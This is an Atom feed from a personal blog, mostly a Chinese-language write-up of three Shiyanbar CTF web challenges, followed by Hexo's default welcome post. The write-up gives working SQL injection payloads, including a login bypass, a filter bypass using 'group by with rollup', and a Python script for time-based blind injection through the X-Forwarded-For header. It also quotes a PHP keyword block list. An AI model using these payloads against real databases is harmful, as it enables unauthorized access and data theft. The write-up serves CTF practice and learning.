<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>iSky0t&#39;s Notes</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://isky0t.github.io/"/>
  <updated>2017-10-03T11:35:54.000Z</updated>
  <id>https://isky0t.github.io/</id>
  
  <author>
    <name>iSky0t</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>shiyanbar-writeup</title>
    <link href="https://isky0t.github.io/2017/10/02/shiyanbar-writeup/"/>
    <id>https://isky0t.github.io/2017/10/02/shiyanbar-writeup/</id>
    <published>2017-10-02T07:49:09.000Z</published>
    <updated>2017-10-03T11:35:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近想参加CTF的比赛，于是国庆放假做一下实验吧的web部分题目 并简单做个记录，并非完全是自己的writeup吧 和别人共同讨论吧！<br><a id="more"></a></p><h2 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h2><blockquote><p>不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!</p></blockquote><p>题干给出这些提示，尝试一些注入关键字<br><code>union</code>、<code>or</code>、<code>||</code>、<code>select</code>、<code>#</code>、<code>--</code>、<code>//</code> 等等这些字符均被过滤 大小写无用<br>但是<code>&#39;</code>并未过滤 初步认为这应该不是一个寻常的SQL注入题吧？猜测SQL语句应该为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">"$_POST['u']"</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">"$_POST['p']"</span></div></pre></td></tr></table></figure><p>而后和朋友讨论后  得出 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username=<span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">''</span>=<span class="string">''</span></div></pre></td></tr></table></figure><p>其实语句就变成了这样</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span></div></pre></td></tr></table></figure><p>提交<code>&#39;=&#39;</code>后得flag，并显示所有的username和password</p><h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h2><blockquote><p>我要把攻击我的人都记录db中去!</p></blockquote><p>打开页面显示 <strong><em>your ip is :x.x.x.x</em></strong></p><p>初步猜测后端代码获取访问者的ip并插入到数据库中，于是尝试修改提交header中的xff字段注入</p><p><img src="/images/shiyanbar01sql.png" alt="sql test"></p><p>经过测试发现存在注入，和猜测的没错，只不过这里不能用<code>if(expr1,expr2,expr3)</code>函数，因为遇到<code>,</code>就断了。应该是和insert中的冲突了吧，于是只能用两个and来判断 ，决定尝试写个Python跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span><span class="params">()</span>:</span></div><div class="line">    url = <span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></div><div class="line">    payloads = <span class="string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'</span>  <span class="comment"># 所有的字符串</span></div><div class="line">    result = <span class="string">''</span>  <span class="comment"># 存放结果</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'Start to SQL test:'</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</div><div class="line">        <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</div><div class="line">            startTime = time.time()</div><div class="line">            sql = <span class="string">"1.1.1.1' and (select user() like '"</span> + result + payload + <span class="string">"%') and sleep(5) and '1'='1"</span></div><div class="line">            sql2 = <span class="string">"1.1.1.1' and (select database() like '"</span> + result + payload + <span class="string">"%') and sleep(5) and '1'='1"</span></div><div class="line">            sql3 = <span class="string">"1.1.1.1' and (select case when substring((select table_name from information_schema.tables where table_schema='web4' limit 1 offset 1) from "</span>+str(i)+<span class="string">" for 1)='"</span>+payload+<span class="string">"' then sleep(5) else 0 end ) and '1'='1"</span></div><div class="line">            sql4 = <span class="string">"1.1.1.1' and (select case when substring((select flag from flag) from "</span>+str(i)+<span class="string">" for 1)='"</span>+payload+<span class="string">"' then sleep(5) else 0 end ) and '1'='1"</span></div><div class="line">            req = urllib2.Request(url)</div><div class="line">            req.add_header(<span class="string">'x-forwarded-for'</span>, sql4)</div><div class="line">            f = urllib2.urlopen(req)</div><div class="line">            <span class="keyword">if</span> (time.time() - startTime &gt; <span class="number">5</span>):</div><div class="line">                result += payload</div><div class="line">                <span class="keyword">print</span> <span class="string">"tablename is "</span> + str(i) + <span class="string">": "</span> + result</div><div class="line">                <span class="keyword">break</span></div><div class="line">                <span class="comment"># print f.read()</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure><p><img src="/images/shiyanbar02user.png" alt="user result"></p><p>根据同样办法注入得到database为web4，但是无法用<code>,</code> 查找资料<a href="https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_substring" target="_blank" rel="external">Mysql手册</a>得到无需使用逗号substr和mid的方法</p><h3 id="不使用逗号"><a href="#不使用逗号" class="headerlink" title="不使用逗号"></a>不使用逗号</h3><p>基于时间的盲注：case when xxx then sleep() else xxxx;</p><p>对于substr和mid:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">substr(data from 1 for 1);</div><div class="line">mid(data from 1 for 1);</div></pre></td></tr></table></figure><p>根据这个手法手工和脚本一起使用</p><ol><li><p>先获取表段数 结果为2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1.1.1.1&apos; and (select case when (select count(*) from information_schema.tables where table_schema=&apos;web4&apos;)=2 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></li><li><p>获取第一个表段名的长度 长度为9，第二个表段长度为4（猜测是flag）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.1.1.1&apos; and (select case when length((select table_name from information_schema.tables where table_schema=&apos;web4&apos; limit 1 offset 0))=9 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div><div class="line">1.1.1.1&apos; and (select case when length((select table_name from information_schema.tables where table_schema=&apos;web4&apos; limit 1 offset 1))=4 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></li><li><p>利用脚本跑出表段名字 第一个字段名为<strong>client_ip</strong> 第二个字段名为<strong>flag</strong></p></li><li>获取<strong>flag</strong>表段中字段的数量、长度和内容<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">字段数为1</div><div class="line">1.1.1.1&apos; and (select case when (select count(column_name) from information_schema.columns where table_name=&apos;flag&apos; and table_schema=&apos;web4&apos;)=1 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div><div class="line">字段名长为4</div><div class="line">1.1.1.1&apos; and (select case when length((select column_name from information_schema.columns where table_name=&apos;flag&apos; and table_schema=&apos;web4&apos;))=4 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div><div class="line">猜测字段名为flag 结果正确</div><div class="line">1.1.1.1&apos; and (select case when substring((select column_name from information_schema.columns where table_name=&apos;flag&apos; and table_schema=&apos;web4&apos;) from 1 for 4)=&apos;flag&apos; then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div><div class="line">先获取内容长度为32  再用脚本跑出flag为cdbf14c9551d5be5612f7bb5d2867853</div><div class="line">1.1.1.1&apos; and (select case when length((select flag from flag))=32 then sleep(1) else 0 end ) and &apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></li></ol><p><img src="/images/shiyanbar03flag.png" alt="flag"></p><h2 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h2><blockquote><p>访问解题链接去访问题目,可以进行答题。根据web题一般解题思路去解答此题。看源码，请求，响应等。提交与题目要求一致的内容即可返回flag。然后提交正确的flag即可得分。web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>简单说明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">preg_match(string $pattern , string $subject)</div><div class="line">匹配字符串 /i不区分大小写 返回值有int(0)未匹配到 int(1)匹配到 和false匹配错误</div></pre></td></tr></table></figure></p><p>大致思路：首先看过滤的关键字，那就没办法用<code>union</code>联合查询一个可控的pwd。那就把希望寄托于将<code>$key[&#39;pwd&#39;]==$_POST[&#39;pwd&#39;]</code> 构造成<code>null=null</code>的等式 ，查询资料后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">group by with rollup </div><div class="line">对某个字段汇总（聚合）新增的一条记录字段本身内容为NULL</div></pre></td></tr></table></figure></p><p><img src="/images/shiyanbar04group.png" alt="group by with rollup"><br>构造提交payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=&apos; or 1=1 group by pwd with rollup limit 1 offset 2 #&amp;pwd=</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近想参加CTF的比赛，于是国庆放假做一下实验吧的web部分题目 并简单做个记录，并非完全是自己的writeup吧 和别人共同讨论吧！&lt;br&gt;
    
    </summary>
    
      <category term="writeup-web" scheme="https://isky0t.github.io/categories/writeup-web/"/>
    
    
      <category term="CTF" scheme="https://isky0t.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="https://isky0t.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://isky0t.github.io/2017/10/01/hello-world/"/>
    <id>https://isky0t.github.io/2017/10/01/hello-world/</id>
    <published>2017-10-01T12:18:46.000Z</published>
    <updated>2017-10-03T01:52:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.<br><a id="more"></a></p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;.&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
